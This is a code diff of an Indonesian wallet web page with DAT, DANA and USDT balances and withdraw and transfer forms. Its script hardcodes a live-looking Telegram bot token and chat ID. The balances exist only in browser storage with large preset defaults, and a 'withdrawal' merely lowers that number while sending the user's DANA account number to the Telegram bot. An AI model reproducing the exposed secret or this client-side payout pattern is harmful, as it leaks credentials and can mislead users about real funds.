@@ -160,12 +160,12 @@
 
   <div id="notifikasi"></div>
 
-<div class="wallet-card">
-  <h2>Dompet Saya</h2>
-  <div class="balance">DAT: <span id="saldoDAT">-</span></div>
-  <div class="balance">DANA: <span id="saldoDANA">-</span></div>
-  <div class="balance">USDT: <span id="saldoUSDT">-</span></div>
-</div>
+  <div class="wallet-card">
+    <h2>Dompet Saya</h2>
+    <div class="balance">DAT: <span id="saldoDAT">-</span></div>
+    <div class="balance">DANA: <span id="saldoDANA">-</span></div>
+    <div class="balance">USDT: <span id="saldoUSDT">-</span></div>
+  </div>
 
   <button class="withdraw-button" onclick="tampilkanForm()">Withdraw</button>
 
@@ -187,7 +187,7 @@
     </div>
   </div>
 
-  <!-- Form Kirim Koin DAT -->
+  <!-- Form Kirim Koin DAT (TIDAK SAYA HAPUS) -->
   <div style="max-width: 400px; margin: 30px auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px;">
     <h3>Kirim Koin DAT</h3>
     <label for="emailTujuan">Email Penerima</label>
@@ -204,14 +204,20 @@
     const telegramToken = '8302323286:AAEM6xferO3kn5Bfx9Gc1tNu2iGeDEhXdr4';
     const telegramChatId = '5788541286';
 
+    // FUNGSI TAMBAHAN YANG DIBUTUHKAN (hanya ini yang saya tambahkan)
+    function tampilkanForm() {
+      document.getElementById("modalWithdraw").style.display = "flex";
+    }
+
+    // Inisialisasi saldo
     const username = localStorage.getItem("currentUser") || "user";
     let saldoDAT = parseFloat(localStorage.getItem(username + "_totalReward") || "44916900");
     let saldoDANA = parseFloat(localStorage.getItem(username + "_totalDANA") || "375");
-   let saldoUSDT = parseFloat(localStorage.getItem(username + "_totalUSDT") || "0");
+    let saldoUSDT = parseFloat(localStorage.getItem(username + "_totalUSDT") || "0");
 
-document.getElementById("saldoDAT").textContent = saldoDAT.toLocaleString('id-ID') + " DAT";
-document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
-document.getElementById("saldoUSDT").textContent = saldoUSDT.toLocaleString('id-ID') + " USDT";
+    document.getElementById("saldoDAT").textContent = saldoDAT.toLocaleString('id-ID') + " DAT";
+    document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
+    document.getElementById("saldoUSDT").textContent = saldoUSDT.toLocaleString('id-ID') + " USDT";
     
     function sembunyikanForm() {
       document.getElementById("modalWithdraw").style.display = "none";
@@ -245,52 +251,37 @@ document.getElementById("saldoUSDT").textContent = saldoUSDT.toLocaleString('id-
       }).catch(err => {
         console.error("Gagal kirim Telegram:", err);
       });
-  
     }
-  function submitWithdraw() {
+
+    function submitWithdraw() {
       const jumlah = parseFloat(document.getElementById("jumlahWithdraw").value);
       const nomorDana = document.getElementById("nomorDana").value.trim();
 
       if (isNaN(jumlah) || jumlah <= 0) {
-        alert("Masukkan jumlah DANA yang valid.");
+        tampilkanNotifikasi("Masukkan jumlah DANA yang valid");
         return;
       }
 
       if (!nomorDana) {
-        alert("Nomor akun DANA tidak boleh kosong.");
+        tampilkanNotifikasi("Nomor akun DANA tidak boleh kosong");
         return;
       }
 
       if (jumlah > saldoDANA) {
-        alert("Saldo DANA tidak mencukupi.");
+        tampilkanNotifikasi("Saldo DANA tidak mencukupi");
         return;
       }
 
-      // Kurangi saldo
       saldoDANA -= jumlah;
       localStorage.setItem(username + "_totalDANA", saldoDANA);
-      document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('en-US') + " DANA";
-
-      alert("✅ Withdraw berhasil!");
-
-      // Sembunyikan form
+      document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
+      
+      tampilkanNotifikasi("✅ Withdraw berhasil diproses");
       sembunyikanForm();
 
-      // Kirim notifikasi ke Telegram
-      const botToken = "ISI_TOKEN_BOT_KAMU";
-      const chatId = "ISI_CHAT_ID_KAMU";
       const pesan = `🔔 *Withdraw Baru!*\n👤 User: ${username}\n💰 Jumlah: ${jumlah.toLocaleString()} DANA\n📱 Nomor DANA: ${nomorDana}\n🕒 Waktu: ${new Date().toLocaleString()}`;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: pesan,
-          parse_mode: "Markdown"
-        })
-      });
-  }
+      kirimTelegramPesan(pesan);
+    }
     
     function prosesTransferEmail() {
       const emailTujuan = document.getElementById("emailTujuan").value.trim().toLowerCase();
